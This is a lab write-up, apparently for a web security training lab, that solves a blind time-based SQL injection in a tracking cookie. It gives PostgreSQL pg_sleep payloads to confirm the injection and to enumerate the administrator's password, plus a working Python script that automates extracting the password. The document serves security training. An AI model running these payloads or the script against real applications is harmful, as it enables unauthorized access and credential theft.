## Lab: Blind SQL injection with time delays and information retrieval

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

---

## Notes

1/ Determine the database type and Confirm that the parameter is vulnerable

```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

```sql
' || (SELECT CASE WHEN (1=2) THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

2/ Confirm that we have a "users" table

```sql
' || (SELECT CASE WHEN ((SELECT 'x' FROM users LIMIT 1)='x') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

3/ Confirm that the "administrator" user exists in the "users" table

```sql
' || (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator')='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

4/ Enumerate the password of the "administrator" user

```sql
' || (SELECT CASE WHEN ((SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

```sql
' || (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--
```

5/ Write a script to automate the password extraction

```python
import requests
import string
import time

url = "https://0a7000bc03b05461818448580060000e.web-security-academy.net"

characters = string.ascii_letters + string.digits
password = ""

session = requests.Session()
tracking_id = session.get(url).cookies.get("TrackingId")

for position in range(1, 21):
    for char in characters:
        guess = password + char

        payload = (
            f"' || (SELECT CASE WHEN ((SELECT SUBSTRING(password,1,{position}) FROM users WHERE username='administrator')='{guess}') THEN pg_sleep(3) ELSE pg_sleep(0) END)--"
        )

        start = time.perf_counter()

        response = session.get(
            url,
            cookies={"TrackingId": tracking_id + payload},
            timeout=10
        )

        elapsed = time.perf_counter() - start

        if elapsed > 2.5:
            password += char
            print(f"Found: {password}")
            break
    else:
        print("No matching character found.")
        break

print("Password:", password)
```

